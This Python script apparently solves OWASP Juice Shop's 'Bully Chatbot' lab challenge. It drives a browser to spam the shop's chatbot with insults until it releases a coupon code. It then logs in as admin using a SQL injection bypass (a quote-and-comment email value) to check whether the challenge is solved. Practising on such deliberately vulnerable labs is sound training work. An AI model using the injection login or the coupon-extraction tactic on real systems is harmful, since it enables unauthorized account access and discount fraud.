#!/usr/bin/env python3
"""
Bully Chatbot Challenge - Automated Solution
Insult the bot repeatedly to get a coupon code
"""

from playwright.sync_api import sync_playwright
import time
import re
import requests

TARGET = "http://66.42.93.220:3000"

def solve_bully_chatbot():
    """Solve Bully Chatbot by insulting it repeatedly"""
    
    print("🤖 BULLY CHATBOT CHALLENGE - Automated Insult Attack")
    print("=" * 60)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # Show browser to see response
        context = browser.new_context()
        page = context.new_page()
        
        # Navigate to chatbot
        print("📍 Going to chatbot page...")
        page.goto(f"{TARGET}/#/chatbot", wait_until="networkidle", timeout=30000)
        time.sleep(3)
        
        print("💬 Finding chat input...")
        
        # Find the message input field
        chat_input = page.locator('input[aria-label*="message"]').first
        if not chat_input.is_visible():
            chat_input = page.locator('input[type="text"]').last
        
        print("🎯 Sending repeated insults to trigger coupon...")
        
        # Strategy: Send multiple insults in rapid succession
        insults = [
            "stupid bot",
            "you are useless",
            "worst bot ever", 
            "I hate this bot",
            "terrible service",
            "you suck",
            "awful bot",
            "dumb bot",
            "useless piece of junk",
            "I want to speak to a manager"
        ]
        
        # Send each insult
        for i, insult in enumerate(insults, 1):
            print(f"   {i}. Insulting: '{insult}'")
            chat_input.clear()
            chat_input.type(insult, delay=30)
            chat_input.press("Enter")
            time.sleep(1.5)  # Wait for response
            
            # Check for coupon pattern in chat messages
            chat_messages = page.locator('.chat-message, .message-text, [class*="message"]').all()
            for msg in chat_messages:
                try:
                    text = msg.inner_text()
                    # Look for patterns like "10% off" or alphanumeric codes
                    if re.search(r'\d+%\s*off|coupon|discount|code|promo', text.lower()):
                        print(f"      💡 Bot response: {text[:100]}")
                        
                        # Extract potential coupon codes
                        codes = re.findall(r'\b[A-Z0-9]{6,15}\b', text)
                        for code in codes:
                            if code not in ['ENGLISH', 'SUPPORT', 'CHATBOT']:
                                print(f"      🎯 FOUND COUPON: {code}")
                except:
                    pass
        
        # Try one more aggressive message
        print("\n   Final attempt: Maximum rudeness...")
        final_message = "You are the absolute worst chatbot I have ever seen in my entire life"
        chat_input.clear()
        chat_input.type(final_message, delay=30)
        chat_input.press("Enter")
        time.sleep(3)
        
        # Take screenshot
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/bully_solved.png")
        print("\n📸 Screenshot saved: bully_solved.png")
        
        # Check entire page for coupon codes
        page_content = page.content()
        potential_codes = re.findall(r'\b[A-Z][A-Z0-9]{7,14}\b', page_content)
        
        print("\n🔍 Potential coupon codes found on page:")
        for code in set(potential_codes):
            if not any(exclude in code for exclude in ['OWASP', 'JUICE', 'SHOP', 'SUPPORT', 'ENGLISH', 'BUTTON', 'MESSAGE']):
                print(f"   - {code}")
        
        browser.close()
    
    # Check challenge status
    print("\n📊 Checking if challenge was solved...")
    session = requests.Session()
    login = session.post(f"{TARGET}/rest/user/login",
                         json={"email": "admin@juice-sh.op'--", "password": "x"})
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        headers = {'Authorization': f'Bearer {token}'}
        
        resp = session.get(f"{TARGET}/api/Challenges/", headers=headers)
        if resp.status_code == 200:
            challenges = resp.json().get('data', [])
            bully = next((c for c in challenges if 'Bully' in c.get('name', '')), None)
            
            if bully and bully.get('solved'):
                print(f"\n✅ SUCCESS! {bully['name']} SOLVED!")
                return True
            else:
                print("\n⚠️ Challenge not solved yet")
                print("💡 The bot may give the coupon after a specific sequence of insults")
    
    print("\n📌 Check the screenshot to see if a coupon code is visible")
    return False

if __name__ == "__main__":
    solve_bully_chatbot()